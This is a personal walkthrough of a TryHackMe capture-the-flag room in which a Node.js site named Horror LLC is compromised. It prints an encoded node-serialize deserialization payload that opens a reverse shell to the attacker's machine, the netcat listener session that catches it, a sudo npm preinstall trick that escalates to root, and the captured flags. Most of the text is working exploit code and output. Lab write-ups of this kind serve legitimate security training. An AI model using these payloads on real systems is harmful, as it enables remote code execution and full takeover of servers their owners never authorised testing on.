---
In JavaScript everything is a terrible mistake.
---

### Introduction

 Start Machine

  

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e83ed0d026262080e63c208/room-content/bd6cd2fef36c881a7b4b3510d717d1cd.png)

**We are Horror LLC,** we specialize in horror, but one of the scarier aspects of our company is our front-end webserver. We can't launch our site in its current state and our level of concern regarding our cybersecurity is growing exponentially. We ask that you perform a thorough penetration test and try to compromise the root account. There are no rules for this engagement. Good luck!

Thanks to [@Luma](https://tryhackme.com/p/qLuma) for testing the room.  

---

_**Note:** This box was part of a competition in which **12** one-month subscription vouchers (kindly donated by_ [@RobertArthurBT](https://twitter.com/RobertArthurBT)_) were given away. The winners have been chosen at random from the list of users without a subscription who completed this room before [9PM BST](https://dateful.com/eventlink/1107927446) on the 11th of October, 2021._

_**The competition is now over.** The results have been announced in the TryHackMe Discord Server._  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.72.52 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.72.52:22
Open 10.10.72.52:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-30 19:35 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:35
Completed Parallel DNS resolution of 1 host. at 19:35, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:35
Scanning 10.10.72.52 [2 ports]
Discovered open port 22/tcp on 10.10.72.52
Discovered open port 80/tcp on 10.10.72.52
Completed Connect Scan at 19:35, 0.19s elapsed (2 total ports)
Initiating Service scan at 19:35
Scanning 2 services on 10.10.72.52
Completed Service scan at 19:35, 26.88s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.72.52.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 6.26s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.49s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Nmap scan report for 10.10.72.52
Host is up, received user-set (0.19s latency).
Scanned at 2022-12-30 19:35:04 EST for 34s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b2d9d60a745de7a99203e4294ce193c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEav+HAGw7xuVSR7QKeKvPc2ZpLfgIJ2azj8wt8S3VdC0yPI5cgFTwrdyZ/b9nHwZb2ibA2Ld12zn4zObnoRLU05emZ0qSpyssEN6+xF2E9SSbe9o79UuJX7KoCAc4oKHdL6vme9Gt1NpmL7UVXaK8LG0wMJ0PAi90NPSp6yCqX+Zh3ox5/ozOw6J0fVWJhq+OpMq3uRdh4C4XQF5ZAN+Yf9uGy5er+VOCOt2Gio2Y+4O2VmQa+d16qJXziOV3tCwronfd8C2FXvbGWNjKnEpn7qmf5TFW7DmOs6lbvhNSqNImKHYPKeMJHDj/0MyjXMHrmYSMvQ/jHsdi1e8wUz4tIOkjrVkEy1BF6rJ20e0mdsJOnk4CrGqbNCvPoCCV0Sn4+IeOsDTqmXjzI6oVZZ/mEJM0p+AxC+a8NUU7IRtDOXQH9bl2/g5N0n3UfpGjz+gmQxQMhcziZobRVUY8b+6TneDi4WLD889XWh0kemP8srXb/BR/DUsCvXJvAZ1gDbU=
|   256 bf32780183af785ee7fe9c834a7daa6b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWImj6zzJJnO+2iTNXciJVkpCVcDC82aeGnvA3GVC4G1J7mwk1TYrRemrCBlwhm+BUzvs0q2qKk/9VCh1+kKlA=
|   256 12ab1380e5ad7307c848d5ca7c7de0af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEIOgTDXXq96o6fNCrn3mQ8JpGFHhx6AtZGEOG4Z+oF
80/tcp open  http    syn-ack
|_http-title: Horror LLC
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 31 Dec 2022 00:35:11 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|     background-posi
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Sat, 31 Dec 2022 00:35:12 GMT
|     Connection: close
|     <html><head>
|     <title>Horror LLC</title>
|     <style>
|     body {
|     background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b);
|     background-size: 300% 300%;
|     -webkit-animation: Background 10s ease infinite;
|     -moz-animation: Background 10s ease infinite;
|     animation: Background 10s ease infinite;
|     @-webkit-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @-moz-keyframes Background {
|     background-position: 0% 50%
|     background-position: 100% 50%
|     100% {
|     background-position: 0% 50%
|     @keyframes Background {
|     background-position: 0% 50%
|_    background-posi
|_http-favicon: Unknown favicon MD5: 8FCEA7DE73B9ED47DE799DB3AE6363A8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.93%I=7%D=12/30%Time=63AF83BF%P=x86_64-pc-linux-gnu%r(Get
SF:Request,E4B,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\r\nDa
SF:te:\x20Sat,\x2031\x20Dec\x202022\x2000:35:11\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\n<html><head>\n<title>Horror\x20LLC</title>\n<style>\n\x20\x
SF:20body\x20{\n\x20\x20\x20\x20background:\x20linear-gradient\(253deg,\x2
SF:0#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x20\x20\x20\x20background-size:\x
SF:20300%\x20300%;\n\x20\x20\x20\x20-webkit-animation:\x20Background\x2010
SF:s\x20ease\x20infinite;\n\x20\x20\x20\x20-moz-animation:\x20Background\x
SF:2010s\x20ease\x20infinite;\n\x20\x20\x20\x20animation:\x20Background\x2
SF:010s\x20ease\x20infinite;\n\x20\x20}\n\x20\x20\n\x20\x20@-webkit-keyfra
SF:mes\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x
SF:20background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2
SF:050%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x20100%\x2050%\
SF:n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20
SF:background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x
SF:20\n\x20\x20@-moz-keyframes\x20Background\x20{\n\x20\x20\x20\x200%\x20{
SF:\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x
SF:20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-p
SF:osition:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%\x20{\n
SF:\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\x20\x20
SF:\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@keyframes\x20Background\x20{\n\x20
SF:\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%
SF:\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\
SF:x20\x20background-posi")%r(HTTPOptions,E4B,"HTTP/1\.1\x20200\x20OK\r\nC
SF:ontent-Type:\x20text/html\r\nDate:\x20Sat,\x2031\x20Dec\x202022\x2000:3
SF:5:12\x20GMT\r\nConnection:\x20close\r\n\r\n<html><head>\n<title>Horror\
SF:x20LLC</title>\n<style>\n\x20\x20body\x20{\n\x20\x20\x20\x20background:
SF:\x20linear-gradient\(253deg,\x20#4a040d,\x20#3b0b54,\x20#3a343b\);\n\x2
SF:0\x20\x20\x20background-size:\x20300%\x20300%;\n\x20\x20\x20\x20-webkit
SF:-animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20\x20
SF:-moz-animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20\x20
SF:\x20animation:\x20Background\x2010s\x20ease\x20infinite;\n\x20\x20}\n\x
SF:20\x20\n\x20\x20@-webkit-keyframes\x20Background\x20{\n\x20\x20\x20\x20
SF:0%\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x2
SF:0\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-position:\x20100%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x20100%
SF:\x20{\n\x20\x20\x20\x20\x20\x20background-position:\x200%\x2050%\n\x20\
SF:x20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@-moz-keyframes\x20Backgroun
SF:d\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x20\x20background-pos
SF:ition:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20\x2050%\x20{\n\x20\
SF:x20\x20\x20\x20\x20background-position:\x20100%\x2050%\n\x20\x20\x20\x2
SF:0}\n\x20\x20\x20\x20100%\x20{\n\x20\x20\x20\x20\x20\x20background-posit
SF:ion:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20}\n\x20\x20\n\x20\x20@key
SF:frames\x20Background\x20{\n\x20\x20\x20\x200%\x20{\n\x20\x20\x20\x20\x2
SF:0\x20background-position:\x200%\x2050%\n\x20\x20\x20\x20}\n\x20\x20\x20
SF:\x2050%\x20{\n\x20\x20\x20\x20\x20\x20background-posi");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:35
Completed NSE at 19:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.62 seconds


┌──(kali㉿kali)-[~]
└─$ curl -I https://hackerone.com
HTTP/2 302 
date: Sat, 31 Dec 2022 00:48:10 GMT
content-type: text/html; charset=utf-8
location: https://www.hackerone.com/
cache-control: no-store
content-disposition: inline; filename="response."

┌──(kali㉿kali)-[~]
└─$ curl -X POST 10.10.72.52/?email=witty -I
HTTP/1.1 200 OK
Set-Cookie: session=eyJlbWFpbCI6IndpdHR5In0=; Max-Age=900000; HttpOnly, Secure
Content-Type: text/html
Date: Sat, 31 Dec 2022 00:50:35 GMT
Connection: keep-alive
Transfer-Encoding: chunked

┌──(kali㉿kali)-[~]
└─$ echo eyJlbWFpbCI6IndpdHR5In0= | base64 -d                                        
{"email":"witty"

┌──(kali㉿kali)-[~]
└─$ cd Node.Js-Security-Course              
                                                                                                              
┌──(kali㉿kali)-[~/Node.Js-Security-Course]
└─$ ls
'command execution.js'   eval.js           hpp.js          nodejsshell.py   redos.js
 deserialization.js      fs.js             LICENSE         node-mongo.js    simple_server.js
 dir_traversal.js        global_scope.js   njsscan.sarif   README.md
                                                                                                              
┌──(kali㉿kali)-[~/Node.Js-Security-Course]
└─$ python2 nodejsshell.py 10.8.19.103 4444                                                               
[+] LHOST = 10.8.19.103
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,57,46,49,48,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))


{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,57,46,49,48,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}

and finally will be

_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,56,46,49,57,46,49,48,51,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()

revshell

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444       
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.72.52.
Ncat: Connection from 10.10.72.52:58378.
Connected!
whoami
dylan
export TERM=xterm;export SHELL=bash;python3 -c 'import pty;pty.spawn("/bin/bash")'
dylan@jason:/opt/webapp$ 
dylan@jason:~$ cat user.txt  
cat user.txt
0ba48780dee9f5677a4461f588af217c

dylan@jason:~$ sudo -l
sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *

dylan@jason:~$ TF=$(mktemp -d)TF=$(mktemp -d)
TF=$(mktemp -d)
dylan@jason:~$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
dylan@jason:~$ chmod 777 $TF  
chmod 777 $TF
dylan@jason:~$ sudo -u root /usr/bin/npm -C $TF --unsafe-perm i
sudo -u root /usr/bin/npm -C $TF --unsafe-perm i

> @ preinstall /tmp/tmp.8AwKQREFcm
> /bin/sh

# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
2cd5a9fd3a0024bfa98d01d69241760e



# cd /opt/webapp
cd /opt/webapp
# ls
ls
index.html  node_modules  package.json  package-lock.json  server.js
# cat server.js
cat server.js
var http = require('http')
var fs = require('fs');
var serialize = require('node-serialize');
var url = require('url');
var xssFilters = require('xss-filters');

http.createServer(onRequest).listen(80);
console.log('Server has started');

let $ = require('cheerio').load(fs.readFileSync('index.html'));


function onRequest(request, response){
        if(request.url == "/" && request.method == 'GET'){
                if(request.headers.cookie){
                        var cookie = request.headers.cookie.split('=');
                        if(cookie[0] == "session"){
                                var str = new Buffer(cookie[1], 'base64').toString();
                                var obj = {"email": "guest"};
                                try {
                                        obj = serialize.unserialize(str);
                                }
                                catch (exception) {
                                        console.log(exception);
                                }
                                var email = xssFilters.inHTMLData(obj.email).substring(0,20);
                                $('h3').replaceWith(`<h3>We'll keep you updated at: ${email}</h3>`);
                        }
                }else{
                        $('h3').replaceWith(`<h3>Coming soon! Please sign up to our newsletter to receive updates.</h3>`);
                }
        }else if(request.url.includes("?email=") && request.method == 'POST'){
                console.log("POSTED email!");
                var qryObj = url.parse(request.url,true).query;
                var email = qryObj.email;
                var data = `{"email":"${email}"}`;
                var data64 = new Buffer(data).toString('base64');
                response.setHeader('Set-Cookie','session='+data64+'; Max-Age=900000; HttpOnly, Secure');
        }
        response.writeHeader(200, {"Content-Type": "text/html"});  
        response.write($.html());
        response.end();
}

var str = new Buffer(cookie[1], 'base64').toString();
                                var obj = {"email": "guest"};
                                try {
                                        obj = serialize.unserialize(str);
                                }

En resumen, este fragmento de código se utiliza para deserializar una cadena de caracteres codificada en Base64 utilizando el módulo "Buffer" y la función "serialize.unserialize". Si la deserialización es exitosa, se asigna el resultado a la variable "obj", de lo contrario se mantiene el valor de "obj" como un objeto literal con la clave "email" y el valor "guest".

┌──(kali㉿kali)-[~/Node.Js-Security-Course]
└─$ curl -X POST 10.10.72.52/?email='<script>alert(hi)</script>' -I
HTTP/1.1 200 OK
Set-Cookie: session=eyJlbWFpbCI6IjxzY3JpcHQ+YWxlcnQoaGkpPC9zY3JpcHQ+In0=; Max-Age=900000; HttpOnly, Secure
Content-Type: text/html
Date: Sat, 31 Dec 2022 01:18:18 GMT
Connection: keep-alive
Transfer-Encoding: chunked

┌──(kali㉿kali)-[~/Node.Js-Security-Course]
└─$ echo eyJlbWFpbCI6IjxzY3JpcHQ+YWxlcnQoaGkpPC9zY3JpcHQ+In0= | base64 -d
{"email":"<script>alert(hi)</script>"}  



```

![[Pasted image 20221230195736.png]]

user.txt  

*0ba48780dee9f5677a4461f588af217c*

root.txt

*2cd5a9fd3a0024bfa98d01d69241760e*


[[VulnNet Roasted]]